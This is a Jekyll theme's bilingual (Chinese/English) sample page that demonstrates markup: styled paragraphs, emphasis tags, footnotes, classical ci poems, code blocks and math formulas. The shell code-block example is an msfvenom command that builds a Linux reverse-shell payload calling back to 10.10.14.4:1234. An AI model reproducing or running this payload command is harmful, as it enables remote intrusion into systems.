---
layout: page
title: 编辑文本示例
math: true
permalink: /Example/
---

<a href="https://jekyll-themes.com">
  <img src="https://img.shields.io/badge/featured%20on-jekyllthemes-red.svg" height="20" alt="jekyll themes shield" loading="lazy">
</a>

# 文章目录

 * a markdown unordered list which will be replaced with the toc, `*` 号前面和后面需要有个空格。
  {:toc}

# 文本

<p style="color: var(--oc-blue-5)">这是一个段落，我要把它设置为蓝色，只需在前面的标签上嵌入style属性即可，style用于内联css。</p>

to <strong>bold text</strong>, use `<strong>`.

to <em>italicize text</em>, use `<em>`.

to <mark>highlight</mark>, use `<mark>`.

缩写, like <abbr title="hypertext markup langage">html</abbr> should use abbr, with an optional `title` attribute for the full phrase.

引用, like<cite> - mark otto</cite>, should use `<cite>`.

<del>deleted text</del> should use `<del>` and <ins>inserted text</ins> should use `<ins>`.

superscript text uses `<sup>` and subscript text uses `<sub>`.

abc <sup> 123

abc <sub> 123

<p style="
    color:white;
    border-radius: 15px 50px;
    background: var(--oc-green-5);
    padding: 20px;
    
">这是一个段落，只需在前面的标签上嵌入style属性即可，style用于内联css。</p>

# 块注释

> 注释块的示例

<blockquote>
很长的注释内容
</blockquote>

# 脚注的示例

when set to true, an ordered[^fn-sample_footnote] list will be outputted instead of an unordered lis

## 百字令 废园有感

- 片红飞减，甚东风不语，只催漂泊。
- 石上胭脂花上露，谁与画眉商略。
- 碧甃瓶沉，紫钱钗掩，雀踏金铃索。
- 韶华如梦，为寻好梦担阁。
- 又是金粉空梁，定巢燕子，一口香泥落。
- 欲写华笺凭寄与，多少心情难托。
- 梅豆圆时，柳棉飘处，失记当时约。
- 斜阳冉冉，断魂分付残角。

### 虞美人

1. 银床淅沥青梧老，
1. 屧粉秋蛩扫。
1. 采香行处蹙连钱，
1. 拾得翠翘何恨不能言。
1. 回廊一寸相思地，
1. 落月成孤倚。
1. <font color="#bd4147">背灯和月就花阴，</font>
1. <font color="#bd4147">已是十年踪迹十年心。</font>

### 虞美人 二

绿阴帘外梧桐影，
玉虎牵金井。
怕听啼鴂出帘迟，[^fnabc]
挨到年年今日两相思。
凄凉满地红心草，
此恨谁知道。
待将幽忆寄新词，
分付芭蕉风定月斜时。

# 代码

use `~~~`

```javascript
// Example can be run directly in your JavaScript console

// Create a function that takes two arguments and returns the sum of those arguments
var adder = new Function("a", "b", "return a + b");

// Call the function
adder(2, 6);
// > 8
```

use ` 反引号

`pust "hello word!"`

use ``` 反引号

```shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.4 LPORT=1234 -f elf > tar
```

# 加载图片

![示例图片](/assets/ruby.webp)

# 公式

需要把变量 `math: true`

$$
C = C_t + \frac {SA(B_1)}{SA_B}|P_1|C_i + \frac {SA(B_2)}{SA_B}|P_2|C_i
$$

$$
C_{split} = SA(B_1)N_1 + SA(B_2)N_2
$$

$$
C_1 = SA(B_1 \cup B_\Delta)N_1 + SA(B_2)(N_2 -1)
$$

$$
C_2 = SA(B_1)(N_1 -1)+SA(B_2 \cup B_\Delta)N_2
$$

$$
\lambda = SA(B_1 \cap B_2)
$$

$$
\frac \lambda {SA(B_{root})} > \alpha
$$

[^fn-sample_footnote]: 这里是一段脚注的内容
[^fnabc]: 第二个注解

# 链接

[示例文件参考链接](http://vfvong.blog/jekyll-theme-tao/essays/examples/2022/01/09/example-content.html#lists)

<hr>
